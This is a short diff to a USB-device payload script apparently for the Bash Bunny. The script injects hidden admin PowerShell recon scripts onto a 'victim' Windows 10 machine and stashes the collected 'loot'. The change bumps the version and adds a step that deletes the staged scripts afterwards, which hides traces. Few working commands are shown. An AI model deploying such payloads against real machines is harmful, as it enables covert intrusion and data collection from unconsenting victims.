@@ -13,8 +13,8 @@
 #                This part of the payload simply injects a powershell script onto the victim and shuts down
 #                It shows how simple the framework makes running hidden windows powershell admin payloads 
 # Author:        p3rki3
-# Props:		 samratashok (for nishang)
-# Version:       0.91
+# Props:         samratashok (for nishang)
+# Version:       0.92
 # Dependencies:  bashbunny powershell framework extension, gohttp (for NET method only)
 # Category:      Recon
 # Target:        Windows 10 (Powershell) - may work on earlier versions, but untested
@@ -52,6 +52,7 @@ INJECT_PSSCRIPT "stage3.ps1" "ComputerInfo.txt"
 
 # Cleanup - close down powershell, clean up the windows run line and move to the loot from the switch folder to a proper loot folder under /loot/Win10Recon
 LED CLEANUP
+REMOVE_PSTEMPFILE "Slimpreter.psm1" "stage1.ps1" "stage2.ps1" "stage3.ps1"
 CLOSE_POWERSHELL
 STASH_LOOT "Win10Recon"
 
